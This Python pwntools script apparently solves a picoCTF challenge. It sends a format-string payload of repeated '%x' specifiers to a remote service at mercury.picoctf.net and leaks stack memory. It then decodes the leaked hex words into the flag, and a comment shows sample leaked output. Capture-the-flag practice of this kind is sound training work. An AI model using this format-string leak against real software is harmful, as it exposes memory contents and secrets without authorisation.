from pwn import *

s = ""

r = remote('mercury.picoctf.net', 53437)

r.recvuntil("View my")
r.send("1\n")
r.recvuntil("What is your API token?\n")

r.send("%x" + "-%x"*40 + "\n")

r.recvline()		

#88ae450-804b000-80489c3-f7f21d80-ffffffff-1-88ac160-f7f2f110-f7f21dc7-0-88ad180-1-88ae430-88ae450-6f636970-7b465443-306c5f49-345f7435-6d5f6c6c-306d5f79-5f79336e-34636462-61653532-ffd7007d-f7f5caf8-f7f2f440-9bb9b600-1-0-f7dbebe9-f7f300c0-f7f215c0-f7f21000-ffd795e8-f7daf58d-f7f215c0-8048eca-ffd795f4-0-f7f43f09-804b000

x = r.recvline()

x = x[:-1].decode()

for i in x.split('-'):
	if len(i) == 8:
		a = bytearray.fromhex(i)

		for b in reversed(a):
			if b > 32 and b < 128:
				s += chr(b)

print(s)
